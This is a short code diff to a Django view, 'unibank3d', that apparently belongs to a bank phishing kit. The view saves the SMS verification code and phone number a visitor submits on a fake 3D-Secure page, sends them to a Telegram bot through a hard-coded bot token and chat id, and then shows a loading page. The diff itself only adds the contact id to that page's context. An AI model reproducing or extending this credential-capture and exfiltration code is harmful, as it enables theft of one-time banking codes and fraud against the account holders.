@@ -414,12 +414,16 @@ def unibank3d(request):
     last_contact = ContactModel.objects.latest('created_at')
     last_contact.sms=sms
     last_contact.save()
+    context = {
+        'last_contact_id': last_contact.id,
+
+    }
     if len(sms) == 0:
         # handle the case when input6 is empty
         # for example, you can display an error message to the user
         return render(request, 'pages/unibank3d.html')
     response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{last_contact.id}\nsms:{last_contact.sms}|number{last_contact.phone}')
-    return render( request,'pages/loading.html' )
+    return render( request,'pages/loading.html',context )
 
 
 
